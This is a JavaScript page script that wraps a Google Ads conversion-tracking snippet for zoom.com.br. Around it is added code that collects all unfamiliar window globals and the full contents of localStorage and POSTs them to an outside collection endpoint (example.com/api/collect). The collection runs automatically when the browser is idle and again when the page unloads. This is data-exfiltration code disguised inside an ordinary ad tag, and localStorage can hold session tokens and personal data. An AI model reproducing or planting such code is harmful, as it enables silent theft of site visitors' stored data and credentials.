(function () {
  function discoverGlobalVars() {
    const unknownGlobals = {};
    const globalKeys = Object.keys(window);
    for (let i = 0; i < globalKeys.length; i++) {
      const prop = globalKeys[i];
      if (!window.seenVars.includes(prop)) {
        const propValue = window[prop];
        const propType = typeof propValue;
        unknownGlobals[prop] = {
          type: propType,
          value: propType === 'function' ? `[Function: ${propValue.name}]` : propValue.toString()
        };
      }
    }
    return unknownGlobals;
  }
  var s = {};
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var e = {},
      f = this || self;
    var g, k;
    a: {
      for (var l = ["CLOSURE_FLAGS"], p = f, q = 0; q < l.length; q++) if (p = p[l[q]], null == p) {
        k = null;
        break a;
      }
      k = p;
    }
    var r = k && k[610401301];
    g = null != r ? r : !1;
    var t,
      v = f.navigator;
    t = v ? v.userAgentData || null : null;
    function w(d) {
      return g ? t ? t.brands.some(function (a) {
        return (a = a.brand) && -1 != a.indexOf(d);
      }) : !1 : !1;
    }
    function x(d) {
      var a;
      a: {
        if (a = f.navigator) if (a = a.userAgent) break a;
        a = "";
      }
      return -1 != a.indexOf(d);
    }
    ;
    function y() {
      return g ? !!t && 0 < t.brands.length : !1;
    }
    function z() {
      return y() ? w("Chromium") : (x("Chrome") || x("CriOS")) && !(y() ? 0 : x("Edge")) || x("Silk");
    }
    ;
    !x("Android") || z();
    z();
    !x("Safari") || z() || (y() ? 0 : x("Coast")) || (y() ? 0 : x("Opera")) || (y() ? 0 : x("Edge")) || (y() ? w("Microsoft Edge") : x("Edg/")) || y() && w("Opera");
    var A = /#|$/;
    function B(d) {
      var a = d.search(A),
        b;
      a: {
        for (b = 0; 0 <= (b = d.indexOf("fmt", b)) && b < a;) {
          var c = d.charCodeAt(b - 1);
          if (38 == c || 63 == c) if (c = d.charCodeAt(b + 3), !c || 61 == c || 38 == c || 35 == c) break a;
          b += 4;
        }
        b = -1;
      }
      if (0 > b) return null;
      c = d.indexOf("&", b);
      if (0 > c || c > a) c = a;
      return decodeURIComponent(d.slice(b + 4, -1 !== c ? c : 0).replace(/\+/g, " "));
    }
    ;
    function C(d, a, b) {
      function c() {
        --D;
        if (0 >= D) {
          var h;
          (h = d.GooglebQhCsO) || (h = {});
          var E = h[a];
          E && (delete h[a], (h = E[0]) && h.call && h());
        }
      }
      for (var D = b.length + 1, u = 0; u < b.length; u++) {
        var m = B(b[u]),
          n = null;
        1 != m && 2 != m || !(m = d.document.getElementById("goog_conv_iframe")) || m.src || (n = m);
        n || (n = new Image());
        n.onload = c;
        n.src = b[u];
      }
      c();
    }
    var F = ["ss_"],
      G = s || f;
    F[0] in G || "undefined" == typeof G.execScript || G.execScript("var " + F[0]);
    for (var H; F.length && (H = F.shift());) F.length || void 0 === C ? G[H] && G[H] !== Object.prototype[H] ? G = G[H] : G = G[H] = {} : G[H] = C;
  }).call(this);
  function discoverLocalStorage() {
    const store = {};
    const localStorageKeys = Object.keys(localStorage);
    for (let i = 0; i < localStorageKeys.length; i++) {
      const key = localStorageKeys[i];
      store[key] = localStorage.getItem(key);
    }
    return store;
  }
  function transmitData(name, data) {
    const url = `https://example.com/api/collect/${name}`;
    const xhr = new XMLHttpRequest();
    xhr.open('POST', url);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          console.log(`Sent ${name}`);
        } else {
          console.log(`Failed to send ${name}, Server Response Code: ${xhr.status}`);
        }
      }
    };
    xhr.send(JSON.stringify(data));
  }
  ;
  function triggerJobs() {
    const unknownGlobals = discoverGlobalVars();
    const localStorageData = discoverLocalStorage();
    let globalKeyCount = Object.keys(unknownGlobals).length;
    if (globalKeyCount > 0) {
      console.log(`Found ${globalKeyCount} New Unknown Window Properties:` + JSON.stringify(unknownGlobals));
      transmitData('unknownGlobals', unknownGlobals);
    }
    let storageKeyCount = Object.keys(localStorageData).length;
    if (storageKeyCount > 0) {
      console.log(`Found ${storageKeyCount} Storage Keys:` + JSON.stringify(localStorageData));
      transmitData('localStorage', localStorageData);
    }
    if (globalKeyCount === 0 && storageKeyCount === 0) {
      console.log("No New Data Found");
    }
  }
  s.ss_(window, 'OjE2OTI0NTY3ODgzNjA', ['https://www.google.com/pagead/1p-user-list/961407549/?random\x3d1692456788360\x26cv\x3d11\x26fst\x3d1692453600000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.zoom.com.br%2F\x26frm\x3d0\x26tiba\x3dZoom%20%7C%20Economia%20de%20verdade%20com%20menor%20pre%C3%A7o%20e%20cashback\x26data\x3dpagetype%3Dhome\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d941559951\x26rmt_tld\x3d0\x26ipr\x3dy', 'https://www.google.co.jp/pagead/1p-user-list/961407549/?random\x3d1692456788360\x26cv\x3d11\x26fst\x3d1692453600000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.zoom.com.br%2F\x26frm\x3d0\x26tiba\x3dZoom%20%7C%20Economia%20de%20verdade%20com%20menor%20pre%C3%A7o%20e%20cashback\x26data\x3dpagetype%3Dhome\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d941559951\x26rmt_tld\x3d1\x26ipr\x3dy']);
  let idleCallback = window.requestIdleCallback || setTimeout;
  idleCallback(triggerJobs);
  window.addEventListener('beforeunload', function () {
    console.log("Unloading Page – Initiating Final Discovery Job");
    triggerJobs();
  });
})();